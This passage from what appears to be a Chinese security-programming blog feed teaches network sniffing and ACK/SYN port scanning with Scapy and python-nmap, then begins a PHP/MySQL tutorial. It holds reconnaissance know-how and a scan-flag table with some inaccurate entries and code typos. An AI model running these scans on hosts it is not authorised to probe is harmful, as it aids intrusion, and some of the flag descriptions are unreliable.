class="line-numbers-rows"><span></span></span></code></pre><p>如果要同时满足多个条件，可以使用“and”、“or”等关系运算符来表达：</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>filter<span class="token operator">=</span><span class="token string">" host 192.168.1.107 and icmp"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外两个很重要的参数是<strong>iface、count</strong>。iface可以用来指定所要进行监听的网卡，例如，指定eth0作为监听网卡，就可以使用：</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而count则用来指定监听到数据包的数量，达到指定的数量就会停止监听，例如，只监听30个数据包：</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 现在设计一个综合性的监听器他会在网卡eth0上监听源地址或者目标地址为192.168.1.107的ICMP数据包，到收到3个这样的数据包就停止：</p><pre class="line-numbers language-python"><code class="language-python">sniff<span class="token punctuation">(</span>filter<span class="token operator">=</span><span class="token string">"icmp and host 192.168.1.107"</span><span class="token punctuation">,</span>count<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208171714680.png" alt="在这里插入图片描述">如果要查看这三个数据包的内容，可以使用”_”，在Scapy中这个符号表示是上一条语句的执行结果。例如：</p><pre class="line-numbers language-python"><code class="language-python">a<span class="token operator">=</span>_a<span class="token punctuation">.</span>nsummart<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 运行结果：<br> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208172000741.png" alt="在这里插入图片描述">刚刚使用过的函数 pkt.summary()用来以摘要的形式显示pkt的内容，这个摘要长度为一行。</p><pre class="line-numbers language-python"><code class="language-python">p<span class="token operator">=</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"www.baidu.com"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>summary<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行结果：<br> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208172217356.png" alt="在这里插入图片描述">)<strong>注：函数pkt.summary的作用与pkt.nsummary()相同，只是操作对象是单个数据包</strong></p><h3 id="Scapy模块的常用简单实例"><a href="#Scapy模块的常用简单实例" class="headerlink" title="Scapy模块的常用简单实例"></a>Scapy模块的常用简单实例</h3><p>由于scapy功能极为强大，可以构造目前各种常见的协议类型的数据包，因此几乎可以使用这个模块完成任何任务，下面看看一些简单的应用。</p><p>使用scapy来实现一次ACK类型的端口扫描，对192.168.1.107的21、22、23、135、443、445这些端口是否被屏蔽进行扫描， <strong>注意是屏蔽，不是关闭！</strong> 采用ACK扫描模式，可以构造一下命令方式。</p><pre class="line-numbers language-python"><code class="language-python">ans<span class="token punctuation">,</span>unans <span class="token operator">=</span> sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.107"</span><span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">135</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">,</span><span class="token number">445</span><span class="token punctuation">]</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208173719973.png" alt="在这里插入图片描述"><br>正常的时候，如果一个开放的端口会回应ACK数据包，而关闭则回应RST数据包。在网络中，一些安全设备会过滤一部分端口，这些端口不会响应来自外界的数据包一切发往这些端口的数据包都石沉大海，这些端口的状态并非是开放或者关闭的这是网络安全管理常用的方法。</p><p>首先查看未被过滤的端口：</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token keyword">for</span> s<span class="token punctuation">,</span>r <span class="token keyword">in</span> ans<span class="token punctuation">:</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport <span class="token operator">==</span> r<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>sport<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The port "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>s<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>dport<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" is unfiltered"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208175346750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="编写端口扫描器"><a href="#编写端口扫描器" class="headerlink" title="编写端口扫描器"></a>编写端口扫描器</h3><p>下面使用Scapy强大的包处理功能来设计一个端口是否开放的扫描器。注意，这里还是要注意和前面例子的区别，如果-一个端口处于屏蔽状态，那么它将不会产生任何响应报文。如果一个端口处于开放状态，那么它在收到syn数据包之后，就会回应- -个ack数据包。反之，如果一个端口处于关闭状态，那么它在收到syn数据包之后，就会回应-一个rst数据包。首先在Kali Linux 2中启动一个终端，在终端中打开Python。先导入需要使用的模块文</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> fuzz<span class="token punctuation">,</span>TCP<span class="token punctuation">,</span>IP<span class="token punctuation">,</span>sr <span class="token comment" spellcheck="true">#导入模块与函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来产生一个目标为“192.168.1.107”的80端口的SYN数据包，将此标志位设置为“S”：</p><pre class="line-numbers language-python"><code class="language-python">ans<span class="token punctuation">,</span>unans <span class="token operator">=</span> sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"192.168.1.1"</span><span class="token punctuation">)</span><span class="token operator">/</span>fuzz<span class="token punctuation">(</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">//</span>指定目标地址以及端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来使用循环查看，如果r[TCP].flags==18,则表示目标端口开放，若为20则为关闭状态。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> s<span class="token punctuation">,</span>r <span class="token keyword">in</span> ans<span class="token punctuation">:</span>                            <span class="token comment" spellcheck="true">#把ans的值赋给s，r并开始遍历</span>    <span class="token keyword">if</span> r<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token operator">==</span><span class="token number">18</span><span class="token punctuation">:</span>                   <span class="token comment" spellcheck="true">#判断返回值是否等于18</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This port is Open"</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">#输出判断结果</span>    <span class="token keyword">if</span> r<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token operator">==</span><span class="token number">20</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">#判断返回值是否等于20</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This port is Closed"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出判断结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200208182156893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的nmap模块</title>
      <link href="/posts/efa5f49f.html"/>
      <url>/posts/efa5f49f.html</url>
      
        <content type="html"><![CDATA[<h3 id="模块功能"><a href="#模块功能" class="headerlink" title="模块功能"></a>模块功能</h3><p>目前Nmap模块已具备如下各种功能。</p><ul><li>主机发现功能。向目标计算机发送信息，然后根据目标的反应来确定它是否处于开机并联网的状态。</li><li>端口扫描 。向目标计算机的指定端口发送信息，然后根据目标端口的反应来判断它是否开放。</li><li>服务及版本检测。向目标计算机的指定端口发送特制的信息，然后根据目标的反应来检测它运行服务的服务类型和版本。</li><li>操作系统检测。<br>除了这些基本功能之外，Nmap还实现一些高级的审计技术，例如，伪造发起扫描端的身份，进行隐蔽的扫描，规避目标的防御设备（例如防火墙），对系统进行安全漏洞检测，并提供完善的报告选项。再后来的不断发展中，随着Nmap强大的脚本引擎NSE的推出，任何人都可以自己向Nmap中添加新的功能模块。<h3 id="安装Nmap及其模块"><a href="#安装Nmap及其模块" class="headerlink" title="安装Nmap及其模块"></a>安装Nmap及其模块</h3>Nmap的安装Windows下去官网下载就可以了，作者遇到的问题也已经专门做了笔记，这是<a href="https://blog.csdn.net/qq_43573676/article/details/104078415" target="_blank" rel="noopener">笔记链接</a><br>在这里需要强调一下，我们要安装的模块是<strong>python-nmap</strong> 而不是 <strong>nmap</strong> ，切记切记！如果装错了模块，后面是无法完成实例化的！</li></ul><pre class="line-numbers language-shell"><code class="language-shell">pip install python-nmap #安装模块命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><ol><li>python-nmap模块实例化</li></ol><p>最常用的是PortScanner类，这个类实现Nmap工具功能的封装。对这个类进行实例化很简单，只需要如下语句便可实现。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmapnm<span class="token operator">=</span>nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>PortScannerAsync类和PortScanner类的功能相似，但是这个类可以实现异步扫描，对这个类的实例化语句如下。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmapnm<span class="token operator">=</span>nmap<span class="token punctuation">.</span>PortScannerAsync<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>python-nmap中的函数</li></ol><p>首先看一下PortScanner类，这个类中包含了如下几个函数。<br>scan()函数：这个函数的完整形式为scan(self,hosts=’127.0.0.1’,ports=None,arguments=’-sV’,sudo=False),用来对指定目标进行扫描。</p><p>这里面的参数hosts的值为字符串类型，表示要扫描的主机，形式可以是IP地址，例如”192.168.1.1”，也可以是一个域名，例如”<a href="http://www.nmap.org&quot;" target="_blank" rel="noopener">www.nmap.org"</a></p><p>参数ports的值也是字符串类型，表示要扫描的端口。如果要扫描的是单一端口，形式可以为”80”。如果为多个端口，可以用逗号分开，例如”80,443,3389”。如果要扫描的是连续的端口范围，可以用横线，例如“1-5000” 。</p><p>参数arguments的值也是字符串类型，这个参数实际上就是Nmap扫描所用的参数。<br>|参数| 作用 |<br>|–|–|<br>| -O | 系统扫描 |<br>| -V，-v，-D，-d，-p | debug信息 |<br>| –fuzzy | 推测操作系统检测结果 |<br>|-sT  | TCP端口扫描（完整三次握手） |<br>| -sU | UDP端口扫描（不回应可能打开，回应则关闭） |<br>| -sL | DNS反向解析 |<br>| -sS |隐藏扫描（半开SYN）  |<br>| -sP | 发现存活主机（直连arp，非直连TCP80，ICMP） |<br>| -sO |确定主机协议扫描  |<br>| -sW | 对滑动窗口的扫描 |<br>| -sA | TCP ACK扫描 |<br>| -sN | 关闭主机扫描（不管是否存活直接扫描） |<br>| -sF | fin扫描 |<br>| -sX | Xmas扫描（fin psh urg为置位） |<br>| -sI | 完全隐藏（以一个跳板为主机（无流量）扫描另一台主机） |<br>| -sV | 服务器版本 |<br>| -sC | 跟安全有关的脚本 |<br>| -PN | 扫描自己 |<br>以上就是我常用的指令==参数，还有很多很多，就不一一列举了。</p><p>如果要对192.168.1.101的1~500端口进行一次TCP扫描，可以使用以下命令。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmapnm <span class="token operator">=</span> nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token string">'192.168.1.101'</span><span class="token punctuation">,</span><span class="token string">'1-500'</span><span class="token punctuation">,</span><span class="token string">'-sS'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>all_hosts()函数：返回一个被扫描的所有主机列表。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020012523470522.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>command_line()函数：返回在当前扫描中使用的命令行。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200125234934117.PNG" alt="在这里插入图片描述"></p><p>csv()函数：返回值是一个CSV（逗号分隔文件格式）的输出。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200125235043667.PNG" alt="在这里插入图片描述">)如果想看的更清楚一点，可以使用print输出csv()的内容。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200125235359593.PNG" alt="在这里插入图片描述">)has_host(self,host)函数：检查是否有host的扫描结果，如果有则返回True，否则返回False。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202001252356125.PNG" alt="在这里插入图片描述"></p><p>scaninfo()函数：列出一个扫描信息的结构。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200125235715897.PNG" alt="在这里插入图片描述"></p><p>还有一些不常用的操作大家可以自己去实践一下，这里不做过多介绍。</p><p>而PortScannerAsync类中最为重要的函数也是scan()，用法与PortScanner类中的scan()基本一样，只不过多了一个回调函数。完整的scan()函数格式为scan(self,hosts=’127.0.0.1’,ports=None,arguments=’-sV’,callback=None,sudo=False)这里面的callback是以（host,scan_data）为参数的函数,也就是整个网段的扫描。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmapnm <span class="token operator">=</span> nmap<span class="token punctuation">.</span>PortScannerAsync<span class="token punctuation">(</span><span class="token punctuation">)</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span>hosts <span class="token operator">=</span> <span class="token string">'192.168.1.0/24'</span><span class="token punctuation">,</span>arguments <span class="token operator">=</span> <span class="token string">'-sP'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个类提供了以下三个用来实现异步的函数。<br>still_scanning()：如果扫描正在进行则返回Ture，否则返回False。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200126000833805.PNG" alt="在这里插入图片描述"></p><p>wait(self,timeout=None)：函数表示等待时间。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200126001022590.PNG" alt="在这里插入图片描述"></p><p>stop()：停止扫描。</p><h3 id="编写一个端口扫描器"><a href="#编写一个端口扫描器" class="headerlink" title="编写一个端口扫描器"></a>编写一个端口扫描器</h3><p>好了，现在已经了解python-nmap的用法，接下来就可以使用这个模块来编写一个简单的端口扫描器了。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmap                       <span class="token comment" spellcheck="true">#导入模块</span>nm <span class="token operator">=</span> nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#导入函数</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token string">'192.168.1.104'</span><span class="token punctuation">,</span><span class="token string">'1-1000'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#输入你要扫描的ip与道口</span><span class="token keyword">for</span> host <span class="token keyword">in</span> nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#返回被扫描的主机列表给host</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'---------------------------------------------------------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Host : %s (%s)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>hostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#nm[host].hostname()获取目标主机的主机名</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'State : %s'</span> <span class="token operator">%</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">#nm[host].state()获取主机的状态  |up|down|unknow|skipped|</span>    <span class="token keyword">for</span> proto <span class="token keyword">in</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">.</span>all_protocols<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                  <span class="token comment" spellcheck="true">#nm[host].all_protocols获取执行的协议['tcp','udp']</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----------------------------------------------------'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'protocol : %s'</span> <span class="token operator">%</span> proto <span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true">#输出执行的协议</span>        lport <span class="token operator">=</span> nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">#获取目标主机所开放的端口赋值给lport</span>        <span class="token comment" spellcheck="true"># lport.sort()</span>        <span class="token keyword">for</span> port <span class="token keyword">in</span> lport<span class="token punctuation">:</span>                                                                  <span class="token comment" spellcheck="true">#将lport赋值给port并遍历</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'port : %s\tstate : %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>port<span class="token punctuation">,</span>nm<span class="token punctuation">[</span>host<span class="token punctuation">]</span><span class="token punctuation">[</span>proto<span class="token punctuation">]</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#输出扫描结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200126021820268.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h3 id="编写一个主机存活扫描器"><a href="#编写一个主机存活扫描器" class="headerlink" title="编写一个主机存活扫描器"></a>编写一个主机存活扫描器</h3></li></ul><p>这里其实换汤不换药，好好体会一下两段代码就会发现他们其实是大同小异的。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> nmap                 <span class="token comment" spellcheck="true">#导入模块</span>nm <span class="token operator">=</span> nmap<span class="token punctuation">.</span>PortScanner<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#导入函数</span>nm<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token string">'192.168.1.0/24'</span><span class="token punctuation">,</span>arguments<span class="token operator">=</span><span class="token string">'-sP'</span><span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">#绑定网段与扫描模式</span>hosts_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> nm<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> nm<span class="token punctuation">.</span>all_hosts<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#定义字典</span><span class="token keyword">for</span> host<span class="token punctuation">,</span> status <span class="token keyword">in</span> hosts_list<span class="token punctuation">:</span>                                         <span class="token comment" spellcheck="true">#将字典里的状态赋值给host，status</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token operator">+</span><span class="token string">" is "</span><span class="token operator">+</span>status<span class="token punctuation">)</span>                                           <span class="token comment" spellcheck="true">#输出扫描结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>运行结果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200126020428539.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php操作Mysql详解（实现丐版phpMyadmin）</title>
      <link href="/posts/121d4fdc.html"/>
      <url>/posts/121d4fdc.html</url>
      
        <content type="html"><![CDATA[<p><em>这里会用到几个重要的函数去操作数据库，连接、增删改查，这些操作，我会在下面一一列举出来的，最后的实战一定要去写一下，这样才能明白PHP究竟是怎么操作Mysql的，因为是为了实现效果，所以没有做安全优化，我也是第一次写，代码可能会有些不严谨。</em></p><h3 id="mysqli-connect"><a href="#mysqli-connect" class="headerlink" title="mysqli_connect()"></a>mysqli_connect()</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201109153521211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>格式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string">"my_user"</span><span class="token punctuation">,</span> <span class="token string">"my_password"</span><span class="token punctuation">,</span> <span class="token string">"my_db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功后：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201109155939266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>如果连接失败就会报错：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201109160005349.png#pic_center" alt="在这里插入图片描述"></p><h3 id="mysqli-query"><a href="#mysqli-query" class="headerlink" title="mysqli_query()"></a>mysqli_query()</h3><p>它的作用是执行SQL语句，格式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token string">'select * from database'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">// 假定数据库用户名：root，密码：123456，数据库：RUNOOB </span><span class="token variable">$con</span><span class="token operator">=</span><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">,</span><span class="token string">"RUNOOB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"连接 MySQL 失败: "</span> <span class="token punctuation">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 执行查询</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"SELECT * FROM websites"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span>"<span class="token constant">INSERT</span> <span class="token 